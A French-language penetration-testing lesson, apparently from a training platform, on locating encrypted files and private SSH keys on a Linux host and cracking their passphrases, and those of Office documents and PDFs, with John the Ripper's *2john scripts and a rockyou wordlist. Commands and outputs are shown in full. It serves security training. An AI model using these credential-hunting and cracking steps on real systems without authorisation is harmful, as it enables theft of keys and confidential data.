# Fichiers protégés

L'utilisation du cryptage des fichiers fait encore souvent défaut dans les affaires privées et professionnelles. Aujourd'hui encore, les e-mails contenant des demandes d'emploi, des relevés de compte ou des contrats sont souvent envoyés en clair. C'est une négligence grave et, dans de nombreux cas, même punissable par la loi. Par exemple, le GDPR exige l'exigence d'un stockage et d'une transmission cryptés des données personnelles dans l'Union européenne. Surtout dans les analyses de rentabilisation, c'est assez différent pour les e-mails. De nos jours, il est assez courant de communiquer des sujets confidentiels ou d'envoyer des données sensibles par e-mail. Cependant, les e-mails ne sont pas beaucoup plus sécurisés que les cartes postales, qui peuvent être interceptées si l'attaquant se positionne correctement.

De plus en plus d'entreprises renforcent leurs précautions et leur infrastructure de sécurité informatique par le biais de cours de formation et de séminaires de sensibilisation à la sécurité. En conséquence, il devient de plus en plus courant pour les employés de l'entreprise de chiffrer/encoder des fichiers sensibles. Néanmoins, même ceux-ci peuvent être piratés et lus avec le bon choix de listes et d'outils. Dans de nombreux cas, le cryptage symétrique comme AES-256 est utilisé pour stocker en toute sécurité des fichiers ou des dossiers individuels. Ici, la même clé est utilisée pour chiffrer et déchiffrer un fichier.

Par conséquent, pour l'envoi de fichiers, un cryptage asymétrique est utilisé, dans lequel deux clés distinctes sont requises. L'expéditeur crypte le fichier avec la clé publique du destinataire. Le destinataire, à son tour, peut ensuite déchiffrer le fichier à l'aide d'une clé privée.

## Chasse aux fichiers encodés

De nombreuses extensions de fichiers différentes peuvent identifier ces types de fichiers cryptés/codés. Par exemple, une liste utile peut être trouvée sur FileInfo. Cependant, pour notre exemple, nous ne regarderons que les fichiers les plus courants comme les suivants :

## Chasse aux fichiers
```
cry0l1t3@unixclient:~$ for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .xls

File extension:  .xls*

File extension:  .xltx

File extension:  .csv
/home/cry0l1t3/Docs/client-emails.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/header-label.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/header.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/no-header.csv
/home/cry0l1t3/ruby-2.7.3/gems/test-unit-3.3.4/test/fixtures/plus.csv
/home/cry0l1t3/ruby-2.7.3/test/win32ole/orig_data.csv

File extension:  .od*
/home/cry0l1t3/Docs/document-temp.odt
/home/cry0l1t3/Docs/product-improvements.odp
/home/cry0l1t3/Docs/mgmt-spreadsheet.ods
...SNIP...
```

Si nous rencontrons des extensions de fichiers sur le système avec lesquelles nous ne sommes pas familiers, nous pouvons utiliser les moteurs de recherche que nous connaissons pour découvrir la technologie qui les sous-tend. Après tout, il existe des centaines d'extensions de fichiers différentes, et personne n'est censé les connaître toutes par cœur. Cependant, nous devons d'abord savoir comment trouver les informations pertinentes qui nous aideront. Encore une fois, nous pouvons utiliser les étapes que nous avons déjà couvertes dans les sections Credential Hunting ou les répéter pour trouver des clés SSH sur le système.

### Chasse aux clés SSH
```
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/cry0l1t3/.ssh/SSH.private:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/cry0l1t3/Mgmt/ceil.key:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

La plupart des clés SSH que nous trouverons de nos jours sont cryptées. Nous pouvons le reconnaître par l'en-tête de la clé SSH car cela montre la méthode de chiffrement utilisée.

### Clés SSH chiffrées
```
cry0l1t3@unixclient:~$ cat /home/cry0l1t3/.ssh/SSH.private

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC

8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
...SNIP...
```

Si nous voyons un tel en-tête dans une clé SSH, nous ne pourrons, dans la plupart des cas, pas l'utiliser immédiatement sans autre action. En effet, les clés SSH cryptées sont protégées par une phrase secrète qui doit être saisie avant utilisation. Cependant, beaucoup sont souvent négligents dans la sélection du mot de passe et sa complexité car SSH est considéré comme un protocole sécurisé, et beaucoup ne savent pas que même le léger AES-128-CBC peut être piraté.

## Craquer avec John
John The Ripper a de nombreux scripts différents pour générer des hachages à partir de fichiers que nous pouvons ensuite utiliser pour le craquage. Nous pouvons trouver ces scripts sur notre système en utilisant la commande suivante.

### Scripts de hachage de John
```
dsgsec@htb[/htb]$ locate *2john*

/usr/bin/bitlocker2john
/usr/bin/dmg2john
/usr/bin/gpg2john
/usr/bin/hccap2john
/usr/bin/keepass2john
/usr/bin/putty2john
/usr/bin/racf2john
/usr/bin/rar2john
/usr/bin/uaf2john
/usr/bin/vncpcap2john
/usr/bin/wlanhcx2john
/usr/bin/wpapcap2john
/usr/bin/zip2john
/usr/share/john/1password2john.py
/usr/share/john/7z2john.pl
/usr/share/john/DPAPImk2john.py
/usr/share/john/adxcsouf2john.py
/usr/share/john/aem2john.py
/usr/share/john/aix2john.pl
/usr/share/john/aix2john.py
/usr/share/john/andotp2john.py
/usr/share/john/androidbackup2john.py
...SNIP...
```

Nous pouvons convertir de nombreux formats différents en hachages uniques et essayer de casser les mots de passe avec cela. Ensuite, nous pouvons ouvrir, lire et utiliser le fichier si nous réussissons. Il existe un script Python appelé ssh2john.py pour les clés SSH, qui génère les hachages correspondants pour les clés SSH chiffrées, que nous pouvons ensuite stocker dans des fichiers.

```
dsgsec@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
dsgsec@htb[/htb]$ cat ssh.hash 

ssh.private:$sshng$0$8$1C258238FD2D6EB0$2352$f7b...SNIP...
```


Ensuite, nous devons personnaliser les commandes en conséquence avec la liste des mots de passe et spécifier notre fichier avec les hachages comme cible à craquer. Après cela, nous pouvons afficher les hachages fissurés en spécifiant le fichier de hachage et en utilisant l'option --show.

### Craquage des clés SSH
```
dsgsec@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
1234         (SSH.private)
1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying
Session completed
```

```
dsgsec@htb[/htb]$ john ssh.hash --show

SSH.private:1234

1 password hash cracked, 0 left
```

## Craquage de documents
Au cours de notre carrière, nous rencontrerons de nombreux documents différents, qui sont également protégés par un mot de passe pour empêcher l'accès par des personnes non autorisées. Aujourd'hui, la plupart des gens utilisent des fichiers Office et PDF pour échanger des informations et des données commerciales.

La quasi-totalité des rapports, de la documentation et des fiches d'information se trouvent sous la forme de documents Office DOC et PDF. C'est parce qu'ils offrent la meilleure représentation visuelle de l'information. John fournit un script Python appelé office2john.py pour extraire les hachages de tous les documents Office courants qui peuvent ensuite être introduits dans John ou Hashcat pour le craquage hors ligne. La procédure pour les casser reste la même.

### Craquage de documents Microsoft Office
```
dsgsec@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
dsgsec@htb[/htb]$ cat protected-docx.hash

Protected.docx:$office$*2007*20*128*16*7240...SNIP...8a69cf1*98242f4da37d916305d8e2821360773b7edc481b
```

```
dsgsec@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash

Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234             (Protected.docx)
1g 0:00:00:00 DONE (2022-02-08 01:25) 2.083g/s 2266p/s 2266c/s 2266C/s trisha..heart
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
dsgsec@htb[/htb]$ john protected-docx.hash --show

Protected.docx:1234
```

## Craquage des PDF
```
dsgsec@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
dsgsec@htb[/htb]$ cat pdf.hash 

PDF.pdf:$pdf$2*3*128*-1028*1*16*7e88...SNIP...bd2*32*a72092...SNIP...0000*32*c48f001fdc79a030d718df5dbbdaad81d1f6fedec4a7b5cd980d64139edfcb7e
```

```
dsgsec@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash

Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 3 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234             (PDF.pdf)
1g 0:00:00:00 DONE (2022-02-08 02:16) 25.00g/s 27200p/s 27200c/s 27200C/s bulldogs..heart
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed
```

```
dsgsec@htb[/htb]$ john pdf.hash --show

PDF.pdf:1234

1 password hash cracked, 0 left
```

L'une des difficultés majeures de ce processus est la génération et la mutation des listes de mots de passe. C'est la condition préalable pour déchiffrer avec succès les mots de passe de tous les fichiers et points d'accès protégés par mot de passe. En effet, il n'est souvent plus suffisant d'utiliser une liste de mots de passe connus dans la plupart des cas, car ceux-ci sont connus des systèmes et sont souvent reconnus et bloqués par des mécanismes de sécurité intégrés. Ces types de fichiers peuvent être plus difficiles à déchiffrer (ou ne pas être déchiffrables du tout dans un délai raisonnable) car les utilisateurs peuvent être contraints de sélectionner un mot de passe ou une phrase secrète plus long et généré de manière aléatoire. Néanmoins, il vaut toujours la peine d'essayer de déchiffrer des documents protégés par mot de passe car ils peuvent fournir des données sensibles qui pourraient être utiles pour approfondir notre accès.

